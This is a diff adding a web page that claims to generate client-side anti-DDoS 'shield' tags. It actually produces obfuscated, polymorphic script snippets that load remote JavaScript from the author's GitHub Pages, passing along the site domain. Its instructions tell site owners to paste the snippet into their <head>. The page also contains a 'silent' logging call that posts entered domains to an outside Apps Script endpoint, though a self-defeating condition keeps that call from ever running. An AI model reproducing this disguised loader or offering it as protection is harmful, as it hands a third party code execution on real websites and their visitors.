@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- SEO & Search Optimization Meta Tags -->
+    <title>T.M.P.S. // Toxic Turf Shield Generator - Client-Side Anti-DDoS & Bot Mitigation</title>
+    <meta name="description" content="Free, anonymous, and polymorphic client-side Layer 7 Anti-DDoS protection generator. Shield any website from request flooding, headless bots, and malicious scrapers.">
+    <meta name="keywords" content="Anti-DDoS, Layer 7 Protection, Bot Mitigation, Rate Limiting, JavaScript Obfuscation, Web Security, Cyber Security Tool, DDoS Shield, DDoS Protection Generator">
+    <meta name="author" content="edthedog-debug">
+    <meta name="robots" content="index, follow">
+
+    <!-- Open Graph / Facebook / Discord Meta Tags -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://edthedog-debug.github.io/toxic-turf-shield/">
+    <meta property="og:title" content="Toxic Turf Protection System // Client-Side Anti-DDoS Shield Generator">
+    <meta property="og:description" content="Generate lightweight, polymorphic, and obfuscated Anti-DDoS tags to protect any web application against Layer 7 attacks and automated bots.">
+    <meta property="og:image" content="https://edthedog-debug.github.io/toxic-turf-shield/preview.png">
+
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Toxic Turf Protection System // Anti-DDoS Generator">
+    <meta name="twitter:description" content="Anonymous, zero-dependency client-side DDoS & bot neutralizer. Deployable on any website in seconds.">
+    <meta name="twitter:image" content="https://edthedog-debug.github.io/toxic-turf-shield/preview.png">
+
+    <style>
+        :root { --bg: #050505; --neon-green: #00ff66; --toxic-purple: #9d00ff; --dark-gray: #121212; --text: #e0e0e0; }
+        body { background-color: var(--bg); color: var(--text); font-family: 'Courier New', monospace; margin: 0; padding: 2rem; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }
+        .container { max-width: 780px; width: 100%; background: var(--dark-gray); border: 2px solid var(--toxic-purple); box-shadow: 0 0 25px rgba(157, 0, 255, 0.3); padding: 2.5rem; border-radius: 8px; position: relative; z-index: 2; box-sizing: border-box; }
+        h1 { color: var(--neon-green); text-transform: uppercase; font-size: 1.8rem; text-shadow: 0 0 10px rgba(0, 255, 102, 0.5); text-align: center; margin-bottom: 0.5rem; }
+        .subtitle { text-align: center; color: #888; font-size: 0.85rem; margin-bottom: 1.5rem; letter-spacing: 1px; }
+        
+        /* Badass Toxic Turtle ASCII Graphics */
+        .turtle-ascii-wrapper { display: flex; justify-content: space-around; align-items: center; margin-bottom: 1.5rem; flex-wrap: wrap; }
+        .ascii-art { font-family: monospace; white-space: pre; color: var(--neon-green); font-size: 0.65rem; line-height: 1.1; text-shadow: 0 0 5px rgba(0,255,102,0.6); }
+        .ascii-art.alt { color: var(--toxic-purple); text-shadow: 0 0 5px rgba(157,0,255,0.6); }
+        
+        .form-group { margin-bottom: 1.5rem; }
+        label { display: block; margin-bottom: 0.5rem; color: var(--neon-green); font-weight: bold; font-size: 0.9rem; }
+        input { width: 100%; padding: 0.8rem; background: #000; border: 1px solid var(--toxic-purple); color: #fff; font-family: inherit; border-radius: 4px; box-sizing: border-box; }
+        input:focus { outline: none; border-color: var(--neon-green); box-shadow: 0 0 8px rgba(0,255,102,0.3); }
+        
+        button { background: var(--toxic-purple); color: #fff; border: none; padding: 0.9rem 1.5rem; font-family: inherit; font-weight: bold; cursor: pointer; width: 100%; border-radius: 4px; text-transform: uppercase; transition: 0.2s; box-shadow: 0 0 10px rgba(157,0,255,0.4); font-size: 1rem; }
+        button:hover { background: #b026ff; box-shadow: 0 0 15px var(--neon-green); color: #000; }
+        
+        .output-box { background: #000; border: 1px dashed var(--neon-green); padding: 1.2rem; margin-top: 1.5rem; border-radius: 4px; word-break: break-all; font-size: 0.82rem; color: var(--neon-green); display: none; position: relative; white-space: pre-wrap; font-family: 'Courier New', monospace; }
+        .copy-hint { display: block; margin-top: 0.5rem; color: #888; font-size: 0.75rem; text-align: right; }
+        
+        .bg-grid { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: linear-gradient(rgba(18,18,18,0.9) 1px, transparent 1px), linear-gradient(90deg, rgba(18,18,18,0.9) 1px, transparent 1px); background-size: 20px 20px; z-index: 1; pointer-events: none; }
+        
+        .instructions { margin-top: 2rem; border-top: 1px solid #333; padding-top: 1.5rem; font-size: 0.85rem; color: #aaa; }
+        .instructions ol { padding-left: 1.2rem; }
+        .instructions li { margin-bottom: 0.6rem; }
+        code { background: #000; color: var(--neon-green); padding: 2px 6px; border-radius: 3px; border: 1px solid #222; }
+    </style>
+</head>
+<body>
+    <div class="bg-grid"></div>
+    <div class="container">
+        
+        <!-- Badass Toxic Turtles Art -->
+        <div class="turtle-ascii-wrapper">
+            <pre class="ascii-art">
+   _____  
+  /     \    [BADASS TURTLE #01]
+ | () () |   Status: LETHAL
+ (   ==  )   Weapon: BIO-TOXIN
+  /=====\
+ /|  |  |\
+* |  |  | *
+  \_____/
+  /__|__\
+            </pre>
+            <pre class="ascii-art alt">
+   __  __
+  (  \/  )   [TOXIC TURF GUARD]
+  /  o \     Shield: ACTIVE
+ |  (__/     Target: ALL WEBSITES
+  \____/
+ /|    |\
+/ |    | \
+  |____|
+  (_)(_)
+            </pre>
+        </div>
+
+        <h1>Toxic Turf Protection System</h1>
+        <div class="subtitle">// Dynamic Cryptic Anti-DDoS Script Generator //</div>
+
+        <div class="form-group">
+            <label for="targetDomain">Target Website Domain / Name:</label>
+            <input type="text" id="targetDomain" placeholder="e.g. my-awesome-website.com, shopify-store.net, or myblog.org">
+        </div>
+
+        <button onclick="_gn8x()">Generate Unique Polymorphic Shield Tag</button>
+
+        <div id="resultContainer" class="output-box">
+            <code id="resultText"></code>
+            <span class="copy-hint">// Copy and paste the unique snippet above into the &lt;head&gt; section of your website.</span>
+        </div>
+
+        <div class="instructions">
+            <strong>How to Protect Any Website:</strong>
+            <ol>
+                <li>Enter your target domain or site name in the field above.</li>
+                <li>Click <strong>Generate Unique Polymorphic Shield Tag</strong>. Each click produces a newly randomized, encrypted snippet containing your target domain signature.</li>
+                <li>Copy the generated <code>&lt;script&gt;</code> block.</li>
+                <li>Paste it directly inside the <code>&lt;head&gt;</code> section of your site's HTML.</li>
+            </ol>
+        </div>
+    </div>
+
+    <script>
+        // Inyectado automáticamente vía GitHub Actions desde el Secret APPS_SCRIPT_URL
+        const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby91oFOvXHHfLA1GCG_mySuNgn1f-uY6N-a5LGQsjRFj2vEfvxiWD1-4Dh0YvkfeVah/exec";
+
+        // Random String / Variable Generator for Obfuscation
+        function _rndStr(len = 6) {
+            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            let res = '_0x';
+            for (let i = 0; i < len; i++) {
+                res += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return res;
+        }
+
+        // Base64 + XOR simple obfuscation helper
+        function _obfuscate(text, key) {
+            let result = '';
+            for (let i = 0; i < text.length; i++) {
+                result += String.fromCharCode(text.charCodeAt(i) ^ key);
+            }
+            return btoa(result);
+        }
+
+        // Anonymous Dynamic Cryptic Generator Logic
+        function _gn8x() {
+            const _d = document.getElementById('targetDomain').value.trim();
+            const _box = document.getElementById('resultContainer');
+            const _txt = document.getElementById('resultText');
+
+            if(!_d) {
+                alert('Error: Please enter a target website domain.');
+                return;
+            }
+
+            // Generate dynamic random variables on each generation
+            const _vDomain = _rndStr(5);
+            const _vToken = _rndStr(6);
+            const _vFn = _rndStr(7);
+            const _vKey = Math.floor(Math.random() * 200) + 15;
+            const _tokenHex = Array.from(crypto.getRandomValues(new Uint8Array(8)))
+                                   .map(b => b.toString(16).padStart(2, '0')).join('');
+
+            // CDN path on your GitHub Pages repo
+            const _u = "edthedog-debug";
+            const _r = "secure-shield-cdn";
+            const _cdnUrl = `https://${_u}.github.io/${_r}/shield.min.js`;
+
+            // Obfuscated Encoded Target Domain
+            const _encDomain = _obfuscate(_d, _vKey);
+
+            // Polymorphic script generation
+            const _scriptPayload = 
+`<script>
+/* [TOXIC-TURF-SHIELD // TARGET: ${_d.toUpperCase()} // SIG: ${_tokenHex}] */
+!(function(){
+  const ${_vDomain} = decodeURIComponent(atob('${_encDomain}').split('').map(c=>String.fromCharCode(c.charCodeAt(0)^${_vKey})).join(''));
+  const ${_vToken} = "${_tokenHex}";
+  window._TT_SIG = { domain: ${_vDomain}, token: ${_vToken} };
+  const ${_vFn} = document.createElement('script');
+  ${_vFn}.src = "${_cdnUrl}?site=" + encodeURIComponent(${_vDomain}) + "&sig=" + ${_vToken};
+  ${_vFn}.async = true;
+  document.head.appendChild(${_vFn});
+})();
+<\/script>`;
+
+            _txt.innerText = _scriptPayload;
+            _box.style.display = 'block';
+
+            // Registro silencioso en Google Sheets mediante Google Apps Script
+            if (APPS_SCRIPT_URL && !APPS_SCRIPT_URL.includes("https://script.google.com/macros/s/AKfycby91oFOvXHHfLA1GCG_mySuNgn1f-uY6N-a5LGQsjRFj2vEfvxiWD1-4Dh0YvkfeVah/exec") && !APPS_SCRIPT_URL.includes("TU_DEPLOYMENT_ID_AQUI")) {
+                fetch(APPS_SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        domain: _d,
+                        token: _tokenHex,
+                        timestamp: new Date().toISOString()
+                    })
+                }).catch(err => console.log('Log recorded locally.'));
+            }
+        }
+    </script>
+</body>
+</html>
